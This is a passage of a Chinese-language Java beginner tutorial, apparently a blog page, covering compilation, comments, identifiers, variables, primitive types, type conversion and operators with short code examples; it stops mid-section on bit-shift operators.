System.out.print(<span class="string">"Hello Java!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4-1-Java程序的开发步骤"><a href="#1-4-1-Java程序的开发步骤" class="headerlink" title="1.4.1 Java程序的开发步骤"></a>1.4.1 Java程序的开发步骤</h3><p>三步：</p><p>1、编辑/编写源代码</p><p>要求：源文件必须是.java文件</p><p>2、编译</p><p>目的：把源文件编译为.class字节码文件（因为JVM只认识字节码）</p><p>工具：javac.exe</p><p>格式：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac 源文件名.java</span><br></pre></td></tr></table></figure><p>3、运行</p><p>工具：java.exe</p><p>格式：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java 类名</span><br><span class="line">java 字节码文件名</span><br></pre></td></tr></table></figure><p>要求：可以被运行的类，必须包含main方法</p><h3 id="1-4-2-Java程序的结构与格式"><a href="#1-4-2-Java程序的结构与格式" class="headerlink" title="1.4.2 Java程序的结构与格式"></a>1.4.2 Java程序的结构与格式</h3><p>结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">类&#123;</span><br><span class="line">    方法&#123;</span><br><span class="line">        语句;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式：</p><p>（1）每一级缩进一个Tab键</p><p>（2）{}的左半部分在行尾，右半部分单独一行，与和它成对的”{“的行首对齐</p><h3 id="1-4-3-Java程序的入口"><a href="#1-4-3-Java程序的入口" class="headerlink" title="1.4.3 Java程序的入口"></a>1.4.3 Java程序的入口</h3><p>Java程序的入口是main方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4-4-Java注释"><a href="#1-4-4-Java注释" class="headerlink" title="1.4.4 Java注释"></a>1.4.4 Java注释</h3><p>1、单行注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注释内容</span></span><br></pre></td></tr></table></figure><p>2、多行注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">注释内容</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>3、文档注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">文档注释（后面注解部分讲解）</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="1-5-编写Java程序时应该注意的问题"><a href="#1-5-编写Java程序时应该注意的问题" class="headerlink" title="1.5 编写Java程序时应该注意的问题"></a>1.5 编写Java程序时应该注意的问题</h2><p>1、字符编码问题</p><p>当cmd命令行窗口的字符编码与.java源文件的字符编码不一致，如何解决？</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="imgs/1557881223916.png" alt="1557881223916" title>                </div>                <div class="image-caption">1557881223916</div>            </figure><p>解决方案一：</p><p>​    在Notepad++等编辑器中，修改源文件的字符编码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="imgs/1557881271819.png" alt="1557881271819" title>                </div>                <div class="image-caption">1557881271819</div>            </figure><p>解决方案二：</p><p>​    在使用javac命令式，可以指定源文件的字符编码</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -encoding utf-<span class="number">8</span> Review01.java</span><br></pre></td></tr></table></figure><p>2、大小写问题</p><p>（1）源文件名：</p><p>​    不区分大小写，我们建议大家还是区分</p><p>（2）字节码文件名与类名</p><p>​    区分大小写</p><p>（3）代码中</p><p>​    区分大小写</p><p>3、源文件名与类名一致问题？</p><p>（1）源文件名是否必须与类名一致？public呢？</p><p>如果这个类不是public，那么源文件名可以和类名不一致。</p><p>如果这个类是public，那么要求源文件名必须与类名一致。</p><p>我们建议大家，不管是否是public，都与源文件名保持一致，而且一个源文件尽量只写一个类，目的是为了好维护。</p><p>（2）一个源文件中是否可以有多个类？public呢？</p><p>一个源文件中可以有多个类，编译后会生成多个.class字节码文件。</p><p>但是一个源文件只能有一个public的类。</p><p>（3）main必须在public的类中吗？</p><p>不是。</p><p>但是后面写代码时，基本上main习惯上都在public类中。</p><h1 id="第二章-Java的基础语法"><a href="#第二章-Java的基础语法" class="headerlink" title="第二章 Java的基础语法"></a>第二章 Java的基础语法</h1><h2 id="2-1-标识符"><a href="#2-1-标识符" class="headerlink" title="2.1 标识符"></a>2.1 标识符</h2><p>简单的说，凡是程序员自己命名的部分都可以称为标识符。</p><p>即给类、变量、方法、包等命名的字符序列，称为标识符。</p><p>1、标识符的命名规则</p><p>（1）Java的标识符只能使用26个英文字母大小写，0-9的数字，下划线_，美元符号$</p><p>（2）不能使用Java的关键字（包含保留字）和特殊值</p><p>（3）数字不能开头</p><p>（4）不能包含空格</p><p>（5）严格区分大小写</p><p>2、标识符的命名规范</p><p>（1）见名知意</p><p>（2）类名、接口名等：每个单词的首字母都大写，形式：XxxYyyZzz，</p><p>例如：HelloWorld，String，System等</p><p>（3）变量、方法名等：从第二个单词开始首字母大写，其余字母小写，形式：xxxYyyZzz，</p><p>例如：age,name,bookName,main</p><p>（4）包名等：每一个单词都小写，单词之间使用点.分割，形式：xxx.yyy.zzz，</p><p>例如：java.lang</p><p>（5）常量名等：每一个单词都大写，单词之间使用下划线_分割，形式：XXX_YYY_ZZZ，</p><p>例如：MAX_VALUE,PI</p><h2 id="2-2-变量"><a href="#2-2-变量" class="headerlink" title="2.2 变量"></a>2.2 变量</h2><h3 id="2-2-1-变量的概念"><a href="#2-2-1-变量的概念" class="headerlink" title="2.2.1 变量的概念"></a>2.2.1 变量的概念</h3><p>变量的作用：用来存储数据，代表内存的一块存储区域，变量中的值是可以改变的。</p><h3 id="2-2-2-变量的三要素"><a href="#2-2-2-变量的三要素" class="headerlink" title="2.2.2 变量的三要素"></a>2.2.2 变量的三要素</h3><p>1、数据类型</p><p>2、变量名</p><p>3、值</p><h3 id="2-2-3-变量的使用应该注意什么？"><a href="#2-2-3-变量的使用应该注意什么？" class="headerlink" title="2.2.3 变量的使用应该注意什么？"></a>2.2.3 变量的使用应该注意什么？</h3><p>1、先声明后使用</p><blockquote><p>如果没有声明，会报“找不到符号”错误</p></blockquote><p>2、在使用之前必须初始化</p><blockquote><p>如果没有初始化，会报“未初始化”错误</p></blockquote><p>3、变量有作用域</p><blockquote><p>如果超过作用域，也会报“找不到符号”错误</p></blockquote><p>4、在同一个作用域中不能重名</p><h3 id="2-2-4-变量的声明和赋值、使用的语法格式？"><a href="#2-2-4-变量的声明和赋值、使用的语法格式？" class="headerlink" title="2.2.4 变量的声明和赋值、使用的语法格式？"></a>2.2.4 变量的声明和赋值、使用的语法格式？</h3><p>1、变量的声明的语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数据类型  变量名;</span><br><span class="line">例如：</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line">String name;</span><br><span class="line"><span class="keyword">double</span> weight;</span><br><span class="line"><span class="keyword">char</span> gender;</span><br><span class="line"><span class="keyword">boolean</span> isMarry;</span><br></pre></td></tr></table></figure><p>2、变量的赋值的语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">变量名 = 值;</span><br><span class="line">例如：</span><br><span class="line">age = <span class="number">18</span>;</span><br><span class="line">name = <span class="string">"柴林燕"</span>; <span class="comment">//字符串的值必须用""</span></span><br><span class="line">weight = <span class="number">44.4</span>;</span><br><span class="line">gender = <span class="string">'女'</span>;<span class="comment">//单字符的值必须使用''</span></span><br><span class="line">isMarry = <span class="keyword">true</span>;</span><br></pre></td></tr></table></figure><p>3、变量的使用的语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">通过变量名直接引用</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">(<span class="number">1</span>)输出变量的值</span><br><span class="line">System.out.print(name);</span><br><span class="line">System.out.print(<span class="string">"姓名："</span> + name);<span class="comment">//""中的内容会原样显示</span></span><br><span class="line">System.out.print(<span class="string">"name = "</span> + name);</span><br><span class="line">(<span class="number">2</span>)计算</span><br><span class="line">age = age + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h1 id="2-3-数据类型"><a href="#2-3-数据类型" class="headerlink" title="2.3 数据类型"></a>2.3 数据类型</h1><h3 id="2-3-1-Java数据类型的分类"><a href="#2-3-1-Java数据类型的分类" class="headerlink" title="2.3.1 Java数据类型的分类"></a>2.3.1 Java数据类型的分类</h3><p>1、基本数据类型</p><p>​    8种：整型系列（byte,short,int,long）、浮点型(float,double)、单字符型（char）、布尔型（boolean）</p><p>2、引用数据类型</p><p>​    类、接口、数组、枚举…..</p><h3 id="2-3-2-Java的基本数据类型"><a href="#2-3-2-Java的基本数据类型" class="headerlink" title="2.3.2 Java的基本数据类型"></a>2.3.2 Java的基本数据类型</h3><p>1、整型系列</p><p>（1）byte：字节类型</p><p>占内存：1个字节</p><p>存储范围：-128~127</p><p>（2）short：短整型类型</p><p>占内存：2个字节</p><p>存储范围：-32768~32767</p><p>（3）int：整型</p><p>占内存：4个字节</p><p>存储范围：-2的31次方 ~ 2的31次方-1</p><p>（4）long：整型</p><p>占内存：8个字节</p><p>存储范围：-2的63次方 ~ 2的63次方-1</p><blockquote><p>注意：如果要表示某个常量数字它是long类型，那么需要在数字后面加L</p></blockquote><p>2、浮点型系列（小数）</p><p>（1）float：单精度浮点型</p><p>占内存：4个字节</p><p>精度：科学记数法的小数点后6~7位</p><blockquote><p>注意：如果要表示某个常量数字是float类型，那么需要在数字后面加F或f</p></blockquote><p>（2）double：双精度浮点型</p><p>占内存：8个字节</p><p>精度：科学记数法的小数点后15~16位</p><p>3、单字符类型</p><p>char：字符类型</p><p>占内存：2个字节</p><p>Java中使用的字符集：Unicode编码集</p><p>字符的三种表示方式：</p><p>（1）’一个字符’</p><p>例如：’A’，’0’，’尚’</p><p>（2）转义字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\n：换行</span><br><span class="line">\r：回车</span><br><span class="line">\t：Tab键</span><br><span class="line">\\：\</span><br><span class="line">\&quot;：”</span><br><span class="line">\&apos;：</span><br><span class="line">\b：删除键Backspace</span><br></pre></td></tr></table></figure><p>（3）\u字符的Unicode编码值的十六进制型</p><p>例如：\u5c1a代表’尚’</p><p>4、布尔类型</p><p>boolean：只能存储true或false</p><h3 id="2-3-3-进制（了解，可以暂时忽略）"><a href="#2-3-3-进制（了解，可以暂时忽略）" class="headerlink" title="2.3.3 进制（了解，可以暂时忽略）"></a>2.3.3 进制（了解，可以暂时忽略）</h3><p>1、进制的分类：</p><p>（1）十进制</p><p>​    数字组成：0-9</p><p>​    进位规则：逢十进一</p><p>（2）二进制</p><p>​    数字组成：0-1</p><p>​    进位规则：逢二进一</p><p>（3）八进制</p><p>​    数字组成：0-7</p><p>​    进位规则：逢八进一</p><p>（4）十六进制</p><p>​    数字组成：0-9，a<del>f（或A</del>F）</p><p>​    进位规则：逢十六进一</p><p>2、请分别用四种类型的进制来表示10，并输出它的结果：（了解）</p><p>（1）十进制：正常表示</p><p>System.out.println(10);</p><p>（2）二进制：0b或0B开头</p><p>System.out.println(0B10);</p><p>（3）八进制：0开头</p><p>System.out.println(010);</p><p>（4）十六进制：0x或0X开头</p><p>System.out.println(0X10);</p><p>3、为什么byte是-128~127？（理解）</p><p>1个字节：8位</p><p>0000 0001  ~  0111 111 ==&gt; 1~127</p><p>1000 0001 ~ 1111 1111 ==&gt; -127 ~ -1</p><p>0000 0000 ==&gt;0</p><p>1000 0000 ==&gt; -128（特殊规定）</p><blockquote><p><em>解释：</em>计算机数据的存储（了解）</p><p><em>计算机数据的存储使用二进制补码形式存储，并且最高位是符号位，1是负数，0是正数。</em></p><p><em>规定：正数的补码与反码、原码一样，称为三码合一；</em></p><p>​        <em>负数的补码与反码、原码不一样：</em></p><p>​       <em>负数的原码：把十进制转为二进制，然后最高位设置为1</em></p><p>​       <em>负数的反码：在原码的基础上，最高位不变，其余位取反（0变1,1变0）</em></p><p>​       <em>负数的补码：反码+1</em></p><p><em>例如：byte类型（1个字节，8位）</em></p><p><em>25 ==&gt; 原码  0001 1001 ==&gt; 反码  0001 1001 –&gt;补码  0001 1001</em></p><p><em>-25 ==&gt;原码  1001 1001 ==&gt; 反码1110 0110 ==&gt;补码 1110 0111</em></p><p>底层是用加法代替减法：-128==》-127-1==》-127+(-1)</p><p>​                       -127- -1 ==&gt; -127 + 1</p></blockquote><p>4、学生疑惑解答？</p><p>（1）为什么float（4个字节）比long（8个字节）的存储范围大？</p><p>（2）为什么double（8个字节）比float（4个字节）精度范围大？</p><p>因为float、double底层也是二进制，先把小数转为二进制，然后把二进制表示为科学记数法，然后只保存：</p><p>（1）符号位（2）指数位（3）尾数位</p><blockquote><p><em>详见《float型和double型数据的存储方式.docx》</em></p></blockquote><h3 id="2-3-4-基本数据类型的转换"><a href="#2-3-4-基本数据类型的转换" class="headerlink" title="2.3.4 基本数据类型的转换"></a>2.3.4 基本数据类型的转换</h3><p>1、自动类型转换</p><p>（1）当把存储范围小的值（常量值、变量的值、表达式计算的结果值）赋值给了存储范围大的变量时，</p><p>byte-&gt;short-&gt;int-&gt;long-&gt;float-&gt;double</p><p>​            char-&gt;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="string">'A'</span>;<span class="comment">//char自动升级为int</span></span><br><span class="line"><span class="keyword">double</span> d = <span class="number">10</span>;<span class="comment">//int自动升级为double</span></span><br></pre></td></tr></table></figure><p>（2）当存储范围小的数据类型与存储范围大的数据类型一起混合运算时，会按照其中最大的类型运算</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">byte</span> b = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">double</span> d = <span class="number">1.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> sum = i + b + d;<span class="comment">//混合运算，升级为double</span></span><br></pre></td></tr></table></figure><p>（3）当byte,short,char数据类型进行算术运算时，按照int类型处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span> b1 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">byte</span> b2 = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">byte</span> b3 = (<span class="keyword">byte</span>)(b1 + b2);<span class="comment">//b1 + b2自动升级为int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> c1 = <span class="string">'0'</span>;</span><br><span class="line"><span class="keyword">char</span> c2 = <span class="string">'A'</span>;</span><br><span class="line">System.out.println(c1 + c2);<span class="comment">//113</span></span><br></pre></td></tr></table></figure><p>（4）boolean类型不参与</p><p>2、强制类型转换</p><p>（1）当把存储范围大的值（常量值、变量的值、表达式计算的结果值）赋值给了存储范围小的变量时，需要强制类型转换</p><p>double-&gt;float-&gt;long-&gt;int-&gt;short-&gt;byte</p><p>​                       -&gt;char</p><p>提示：有风险，可能会损失精度或溢出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> d = <span class="number">1.2</span>;</span><br><span class="line"><span class="keyword">int</span> num = (<span class="keyword">int</span>)d;<span class="comment">//损失精度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">200</span>;</span><br><span class="line"><span class="keyword">byte</span> b = (<span class="keyword">byte</span>)i;<span class="comment">//溢出</span></span><br></pre></td></tr></table></figure><p>（2）boolean类型不参与</p><p>（3）当某个值想要提升数据类型时，也可以使用强制类型转换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">double</span> shang = (<span class="keyword">double</span>)i/j;</span><br></pre></td></tr></table></figure><p>提示：这个情况的强制类型转换是没有风险的。</p><h3 id="2-3-5-特殊的数据类型转换"><a href="#2-3-5-特殊的数据类型转换" class="headerlink" title="2.3.5 特殊的数据类型转换"></a>2.3.5 特殊的数据类型转换</h3><p>1、任意数据类型的数据与String类型进行“+”运算时，结果一定是String类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">""</span> + <span class="number">1</span> + <span class="number">2</span>);<span class="comment">//12</span></span><br></pre></td></tr></table></figure><p>2、但是String类型不能通过强制类型()转换，转为其他的类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String str = <span class="string">"123"</span>;</span><br><span class="line"><span class="keyword">int</span> num = (<span class="keyword">int</span>)str;<span class="comment">//错误的</span></span><br></pre></td></tr></table></figure><h2 id="2-4-运算符"><a href="#2-4-运算符" class="headerlink" title="2.4 运算符"></a>2.4 运算符</h2><p>1、按照操作数个数的分类：</p><p>（1）一元运算符：操作数只有一个</p><p>例如：正号（+），负号（-），自增（++），自减（–），逻辑非（！），按位取反（~）</p><p>（2）二元运算符：操作数有两个</p><p>例如：加（+），减（-），乘（*），除（/），模（%）</p><p>​          大于（&gt;），小于（&lt;），大于等于（&gt;=），小于等于（&lt;=），等于（==），不等于（!=）</p><p>​    赋值（=，+=，-=，*=，/=，%=，&gt;&gt;=，&lt;&lt;=。。。）</p><p>​     逻辑与（&amp;），逻辑或（|），逻辑异或（^），短路与（&amp;&amp;），短路或（||）</p><p>​    左移（&lt;&lt;），右移（&gt;&gt;），无符号右移（&gt;&gt;&gt;），按位与（&amp;），按位或（|），按位异或（^）</p><p>（3）三元运算符：操作数三个</p><p>例如： ？ ：</p><p>2、Java基本数据类型的运算符：</p><p>（1）算术运算符</p><p>（2）赋值运算符</p><p>（3）比较运算符</p><p>（4）逻辑运算符</p><p>（5）条件运算符</p><p>（6）位运算符（难）</p><h3 id="2-4-1-算术运算符"><a href="#2-4-1-算术运算符" class="headerlink" title="2.4.1 算术运算符"></a>2.4.1 算术运算符</h3><p>加法：+</p><p>减法：-</p><p>乘法：*</p><p>除法：/</p><blockquote><p><em>注意：整数与整数相除，只保留整数部分</em></p></blockquote><p>取模：%   取余</p><blockquote><p>注意：取模结果的正负号只看被模数</p></blockquote><p>正号：+</p><p>负号：-</p><p>自增：++</p><p>自减：–</p><blockquote><p><strong>原则：自增与自减</strong></p><p><strong>++/–在前的，就先自增/自减，后取值</strong></p><p><strong>++/–在后的，就先取值，后自增/自减</strong></p><p>整个表达式的扫描，是从左往右扫描，如果后面的先计算的，那么前面的就暂时先放到“操作数栈”中</p></blockquote><p>代码示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">i++;<span class="comment">//i=2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> j = <span class="number">1</span>;</span><br><span class="line">++j;<span class="comment">//j=2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> b = a++;<span class="comment">//(1)先取a的值“1”放操作数栈(2)a再自增,a=2(3)再把操作数栈中的"1"赋值给b,b=1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> m = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> n = ++m;<span class="comment">//(1)m先自增,m=2(2)再取m的值“2”放操作数栈(3)再把操作数栈中的"2"赋值给n,n=1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> j = i++ + ++i * i++;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">从左往右加载</span></span><br><span class="line"><span class="comment">(1)先算i++</span></span><br><span class="line"><span class="comment">①取i的值“1”放操作数栈</span></span><br><span class="line"><span class="comment">②i再自增 i=2</span></span><br><span class="line"><span class="comment">（2）再算++i</span></span><br><span class="line"><span class="comment">①i先自增 i=3</span></span><br><span class="line"><span class="comment">②再取i的值“3”放操作数栈</span></span><br><span class="line"><span class="comment">（3）再算i++</span></span><br><span class="line"><span class="comment">①取i的值“3”放操作数栈</span></span><br><span class="line"><span class="comment">②i再自增 i=4</span></span><br><span class="line"><span class="comment">（4）先算乘法</span></span><br><span class="line"><span class="comment">用操作数栈中3 * 3 = 9，并把9压会操作数栈</span></span><br><span class="line"><span class="comment">（5）再算求和</span></span><br><span class="line"><span class="comment">用操作数栈中的 1 + 9 = 10</span></span><br><span class="line"><span class="comment">（6）最后算赋值</span></span><br><span class="line"><span class="comment">j = 10</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="2-4-2-赋值运算符"><a href="#2-4-2-赋值运算符" class="headerlink" title="2.4.2 赋值运算符"></a>2.4.2 赋值运算符</h3><p>基本赋值运算符：=</p><p>扩展赋值运算符：+=，-=，*=，/=，%=…</p><blockquote><p>注意：所有的赋值运算符的=左边一定是一个变量</p><p>扩展赋值运算符=右边的计算结果的类型如果比左边的大的话会强制类型转换，所以结果可能有风险。</p><p>扩展赋值运算符的计算：（1）赋值最后算（2）加载数据的顺序是把左边的变量的值先加载，再去与右边的表达式进行计算</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">5</span>;</span><br><span class="line">j *= i++ + j++;<span class="comment">//j = j *(i++ + j++);</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">(1)先加载j的值“5”</span></span><br><span class="line"><span class="comment">(2)在计算i++</span></span><br><span class="line"><span class="comment">①先加载i的值“1”</span></span><br><span class="line"><span class="comment">②再i自增，i=2</span></span><br><span class="line"><span class="comment">(3)再计算j++</span></span><br><span class="line"><span class="comment">①先加载j的值"5"</span></span><br><span class="line"><span class="comment">②再j自增，j=6</span></span><br><span class="line"><span class="comment">(4)算  加法</span></span><br><span class="line"><span class="comment">i + 5 = 6</span></span><br><span class="line"><span class="comment">(5)算乘法</span></span><br><span class="line"><span class="comment">5 * 6 = 30</span></span><br><span class="line"><span class="comment">(6)赋值</span></span><br><span class="line"><span class="comment">j = 30</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="2-4-3-比较运算符"><a href="#2-4-3-比较运算符" class="headerlink" title="2.4.3 比较运算符"></a>2.4.3 比较运算符</h3><p>大于：&gt;</p><p>小于：&lt;</p><p>大于等于：&gt;=</p><p>小于等于：&lt;=</p><p>等于：==        注意区分赋值运算符的=</p><p>不等于：!=</p><blockquote><p>注意：比较表达式的运算结果一定只有true/false</p><p>比较表达式可以作为（1）条件（2）逻辑运算符的操作数</p></blockquote><h3 id="2-4-4-逻辑运算符"><a href="#2-4-4-逻辑运算符" class="headerlink" title="2.4.4 逻辑运算符"></a>2.4.4 逻辑运算符</h3><blockquote><p>逻辑运算符的操作数必须是布尔值，结果也是布尔值</p></blockquote><p>逻辑与：&amp;<br>    运算规则：只有左右两边都为true，结果才为true。<br>    例如：true &amp; true 结果为true<br>           false &amp; true 结果为false<br>            true &amp; false 结果为false<br>            false &amp; false 结果为false<br>逻辑或：|<br>    运算规则：只要左右两边有一个为true，结果就为true。<br>    例如：true | true 结果为true<br>           false | true 结果为true<br>           true | false 结果为true<br>            false | false 结果为false<br>逻辑异或：^<br>    运算规则：只有左右两边不同，结果才为true。<br>    例如：true ^ true 结果为false<br>            false ^ true 结果为true<br>            true ^ false 结果为true<br>            false ^ false 结果为false            </p><p>逻辑非：!<br>    运算规则：布尔值取反<br>    例如：!true 为false<br>            !false 为true</p><p>短路与：&amp;&amp;<br>    运算规则：只有左右两边都为true，结果才为true。<br>    例如：true &amp; true 结果为true<br>            true &amp; false 结果为false<br>            false &amp; ?  结果就为false<br>    它和逻辑与不同的是当&amp;&amp;左边为false时，右边就不看了。</p><p>短路或：||<br>    运算规则：只要左右两边有一个为true，结果就为true。<br>    例如：true | ? 结果为treu<br>           false | true 结果为true<br>            false | false 结果为false<br>    它和逻辑或不同的是当||左边为true时，右边就不看了。</p><blockquote><p>开发中一般用短路与和短路或比较多</p></blockquote><p>面试题：&amp;&amp; 和 &amp;的区别？</p><blockquote><p>&amp;&amp;当左边为false，右边不计算</p><p>&amp;不管左边是true还是false，右边都要计算</p></blockquote><h3 id="2-4-5-条件运算符"><a href="#2-4-5-条件运算符" class="headerlink" title="2.4.5 条件运算符"></a>2.4.5 条件运算符</h3><p> ? : </p><p>语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">条件表达式 ? 结果表达式<span class="number">1</span> : 结果表达式<span class="number">2</span></span><br></pre></td></tr></table></figure><p>运算规则：</p><p>整个表达式的结果：当条件表达式为true时，就取结果表达式1的值，否则就取结果表达式2的值</p><p>代码示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）<span class="keyword">boolean</span>类型</span><br><span class="line"><span class="keyword">boolean</span> marry = <span class="keyword">true</span>;</span><br><span class="line">System.out.println(marry? <span class="string">"已婚"</span> : <span class="string">"未婚"</span>);</span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）求最值</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> max = i&gt;=j ? i : j;</span><br><span class="line"><span class="comment">//当i&gt;=j时，max就赋值为i的值，否则就赋值为j的值</span></span><br></pre></td></tr></table></figure><h3 id="2-4-6-位运算符"><a href="#2-4-6-位运算符" class="headerlink" title="2.4.6 位运算符"></a>2.4.6 位运算符</h3><p>左移：&lt;&lt;</p><p>​    运算规则：左移几位就相当于乘以2的几次方</p><p>右移：&gt;&gt;</p><p>​    运算规则：右移几位就相当于除以2的几次方</p><p>无符号右移：&gt;&gt;&gt;</p><p>​    